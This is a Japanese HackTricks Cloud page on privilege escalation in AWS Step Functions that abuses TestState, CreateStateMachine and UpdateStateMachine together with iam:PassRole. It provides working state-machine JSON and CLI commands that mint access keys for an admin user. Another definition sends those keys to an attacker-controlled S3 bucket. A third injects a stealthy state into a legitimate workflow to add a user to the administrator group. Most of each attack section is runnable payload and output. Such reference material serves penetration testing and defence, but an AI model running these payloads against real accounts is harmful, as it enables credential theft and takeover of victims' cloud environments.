# AWS - Step Functions Privesc

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** をフォローする。**
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>

## Step Functions

このAWSサービスに関する詳細情報は、以下をチェックしてください:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

**`states:TestState`** および **`iam:PassRole`** 権限を持つ攻撃者は、既存のステートマシンを作成または更新せずに、任意のステートをテストし、任意のIAMロールをそれに渡すことができます。これにより、ロールの権限を使用して他のAWSサービスに未承認でアクセスする可能性があります。これらの権限を組み合わせると、ワークフローの操作からデータの変更、データ漏洩、リソース操作、特権昇格まで、幅広い未承認のアクションにつながる可能性があります。
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
以下の例は、これらの権限を活用して**`admin`**ユーザーのアクセスキーを作成するステートをテストする方法を示しています。この許可されたロールは、高い特権を持つポリシー（例: **`arn:aws:iam::aws:policy/AdministratorAccess`**）が関連付けられている必要があります。これにより、ステートが**`iam:CreateAccessKey`**アクションを実行できます。

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **特権昇格を実行するために実行された**コマンド:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **潜在的影響**: ワークフローの不正な実行と操作、および機密リソースへのアクセスが可能となり、重大なセキュリティ侵害につながる可能性があります。

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

**`states:CreateStateMachine`**と**`iam:PassRole`**を持つ攻撃者は、ステートマシンを作成し、任意のIAMロールを提供することができ、そのロールの権限で他のAWSサービスに不正アクセスできるようになります。以前の権限昇格テクニック(**`states:TestState`** & **`iam:PassRole`**)とは異なり、この方法は自己実行しません。**`states:StartExecution`**または**`states:StartSyncExecution`**権限(**`states:StartSyncExecution`**は**標準ワークフローでは利用できず、単にステートマシンを表現するため**)も必要です。これにより、ステートマシン上で実行を開始することができます。
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
以下の例は、`admin`ユーザーのためのアクセスキーを作成し、これを攻撃者が制御するS3バケットに外部流出させるステートマシンを作成する方法を示しています。これは、これらの権限とAWS環境の許可ロールを活用します。この許可ロールには、それに関連付けられた高特権ポリシー（たとえば`arn:aws:iam::aws:policy/AdministratorAccess`）がある必要があります。これにより、ステートマシンが`iam:CreateAccessKey`および`s3:putObject`アクションを実行できます。

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **ステートマシンを作成するために実行される**コマンド**：**
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- 以前に作成したステートマシンの実行を開始するために実行される**コマンド**：
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

攻撃者が制御するS3バケットは、被害者アカウントからのs3:PutObjectアクションを受け入れる権限を持つ必要があります。

{% endhint %}

- **潜在的な影響**: ワークフローの実行と操作、機密リソースへのアクセスが不正に行われ、重大なセキュリティ侵害につながる可能性があります。

### `states:UpdateStateMachine` & (必ずしも必要ではない) `iam:PassRole`

**`states:UpdateStateMachine`** 権限を持つ攻撃者は、ステートマシンの定義を変更し、特別なステルス状態を追加して特権昇格につながる可能性があることができます。これにより、合法的なユーザーがステートマシンの実行を開始すると、この新しい悪意のあるステルス状態が実行され、特権昇格が成功します。

ステートマシンに関連付けられたIAMロールがどれだけ許可的かによって、攻撃者は2つの状況に直面します:

1. **許可的なIAMロール**: ステートマシンに関連付けられたIAMロールが既に許可的である場合（たとえば、**`arn:aws:iam::aws:policy/AdministratorAccess`** ポリシーが添付されている場合）、特権昇格するために **`iam:PassRole`** 権限が必要ではないため、IAMロールも更新する必要がないため、ステートマシンの定義だけで特権昇格が可能です。
2. **許可されていないIAMロール**: 前述のケースとは対照的に、ここでは、攻撃者はステートマシンに許可のあるIAMロールを関連付ける必要があるため、ステートマシンの定義を変更するだけでなく、 **`iam:PassRole`** 権限も必要となります。
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
以下の例では、HelloWorld Lambda関数を呼び出すだけの正当なステートマシンを更新して、ユーザー**`unprivilegedUser`**を**`administrator`** IAMグループに追加する追加ステートを追加する方法を示しています。これにより、正当なユーザーが更新されたステートマシンの実行を開始すると、この新しい悪意のあるステルスステートが実行され、特権昇格が成功します。

{% hint style="warning" %}

ステートマシンに許可のあるIAMロールが関連付けられていない場合、IAMロールを更新して許可のあるIAMロールを関連付けるためには、**`iam:PassRole`**権限も必要です（たとえば、**`arn:aws:iam::aws:policy/AdministratorAccess`**ポリシーが添付されたIAMロール）。

{% endhint %}

{% tabs %}

{% tab title="正当なステートマシン" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="悪意のある更新されたステートマシン" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
- **正当なステートマシンを更新する**ために実行された**コマンド**：
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **潜在的影響**: ワークフローの未承認の実行と操作、および機密リソースへのアクセスが可能となり、重大なセキュリティ侵害につながる可能性があります。

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする**
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。

</details>
